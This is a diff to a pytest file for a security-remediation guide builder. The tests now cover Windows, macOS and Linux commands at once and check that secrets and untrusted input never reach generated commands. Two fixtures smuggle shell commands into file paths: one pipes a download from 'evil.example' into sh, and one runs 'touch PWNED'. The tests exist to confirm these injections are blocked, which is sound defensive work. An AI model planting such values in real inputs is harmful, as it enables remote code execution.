@@ -1,10 +1,10 @@
-"""OS·사용 환경별 대응 가이드 (#33)."""
+"""세 OS 대응 가이드와 명령 안전성."""
 
 import pytest
 
 from app.llm.pipeline import Explainer
 from app.llm.remediation import build_guide, detect_package_manager
-from app.llm.schemas import FindingInput, UserEnvironment
+from app.llm.schemas import FindingInput
 from tests.conftest import blue_draft
 
 pytestmark = pytest.mark.anyio
@@ -80,12 +80,6 @@ def test_pip_uses_py_launcher_on_windows():
     assert any("requirements.txt" in m for m in up.manual_steps)
 
 
-def test_only_requested_os_is_built():
-    guide = build_guide(dep("package-lock.json"), UserEnvironment(os="macos"))
-
-    assert all(b.os == "macos" for a in guide.actions for b in a.commands)
-
-
 def test_no_fixed_version_has_no_commands():
     guide = build_guide(dep("package-lock.json", target=None))
 
@@ -104,9 +98,9 @@ def test_secret_guide_rotates_first_with_console_link():
 
 
 def test_windows_commands_are_powershell_51_safe():
-    guide = build_guide(secret(), UserEnvironment(os="windows"))
+    guide = build_guide(secret())
 
-    script = "\n".join(line for a in guide.actions for b in a.commands for line in b.lines)
+    script = "\n".join(line for a in guide.actions for b in a.commands if b.os == "windows" for line in b.lines)
     for unix_only in ("rm -rf", "&&", "grep ", "echo '", "export ", "python3"):
         assert unix_only not in script, unix_only
     assert "Add-Content" in script and "Select-String" in script
@@ -119,12 +113,10 @@ def test_secret_values_never_appear_in_commands():
     assert "<새로 발급한 값>" in script  # 자리표시자만, 실제 값은 편집기로
 
 
-def test_hosting_specific_env_step():
-    vercel = build_guide(secret(), UserEnvironment(os="linux", hosting="vercel"))
-    netlify = build_guide(secret(), UserEnvironment(os="linux", hosting="netlify"))
-
-    assert lines(action(vercel, "hosting_env"), "linux") == ["vercel env add SUPABASE_SERVICE_ROLE_KEY production"]
-    assert not action(netlify, "hosting_env").commands and action(netlify, "hosting_env").manual_steps
+def test_secret_guide_includes_platform_independent_deployment_step():
+    guide = build_guide(secret())
+    steps = [step for a in guide.actions for step in a.manual_steps]
+    assert "배포 환경(호스팅)의 환경 변수도 새 키로 바꾸고 다시 배포하세요." in steps
 
 
 def test_committed_env_file_is_untracked():
@@ -164,16 +156,16 @@ def test_code_finding_gets_optional_branch_and_rescan():
     assert guide.actions[-1].id == "rescan"
 
 
-async def test_environment_reaches_prompt_and_result(fake_vllm, findings):
+async def test_all_os_guide_reaches_prompt_and_result(fake_vllm, findings):
     fake_vllm.queue("BlueDraft", blue_draft())
 
-    result = await Explainer(fake_vllm.client()).blue(findings[3], environment=UserEnvironment(os="windows"))
+    result = await Explainer(fake_vllm.client()).blue(findings[3])
 
     prompt = fake_vllm.calls("BlueDraft")[0]["messages"][-1]["content"]
-    assert '<environment>\n{"os": "windows", "package_manager": "npm"}' in prompt
     assert "<actions>" in prompt and "upgrade_dependency" in prompt
     assert "npm install next@15.2.3" not in prompt  # 명령 자체는 모델에 넘기지 않음
-    assert result.guide.environment.os == "windows"
+    assert set(result.guide.model_dump()) == {"package_manager", "actions"}
+    assert {b.os for a in result.guide.actions for b in a.commands} == {"windows", "macos", "linux"}
     assert lines(action(result.guide, "upgrade_dependency"), "windows") == ["npm install next@15.2.3"]
 
 
@@ -189,7 +181,7 @@ def all_command_text(guide) -> str:
 def test_review_repro_lockfile_path_is_not_executed():
     f = dep("web$(curl -s evil.example|sh)/package-lock.json")
 
-    guide = build_guide(f, UserEnvironment(os="linux"))
+    guide = build_guide(f)
 
     commit = action(guide, "commit_lockfile")
     assert not commit.commands and commit.manual_steps
@@ -197,7 +189,7 @@ def test_review_repro_lockfile_path_is_not_executed():
 
 
 def test_review_repro_env_path_is_not_executed():
-    guide = build_guide(secret(path="cfg;touch PWNED;/.env", rule="generic-api-key"), UserEnvironment(os="linux"))
+    guide = build_guide(secret(path="cfg;touch PWNED;/.env", rule="generic-api-key"))
 
     untrack = action(guide, "stop_tracking_env")
     assert not untrack.commands and untrack.manual_steps
@@ -255,9 +247,8 @@ def test_untrusted_fields_never_reach_commands(payload):
         ),  # fmt: skip
     ]
     for f in cases:
-        for os_ in ("windows", "macos", "linux"):
-            guide = build_guide(f, UserEnvironment(os=os_, hosting="vercel"))
-            # 규칙 ID 는 [A-Z0-9_] 환경 변수 이름으로만 바뀌어 들어갑니다 (X_TOUCH_PWNED). 실행 가능한 원문이 없어야 합니다
-            assert "touch PWNED" not in all_command_text(guide), (f.fingerprint, os_)
-            sql = [m for a in guide.actions for m in a.manual_steps if m.startswith("alter table")]
-            assert not any("touch PWNED" in line for line in sql)
+        guide = build_guide(f)
+        # 규칙 ID는 안전한 환경 변수 이름으로만 변환합니다. 세 OS 명령 모두 검사합니다.
+        assert "touch PWNED" not in all_command_text(guide), f.fingerprint
+        sql = [m for a in guide.actions for m in a.manual_steps if m.startswith("alter table")]
+        assert not any("touch PWNED" in line for line in sql)
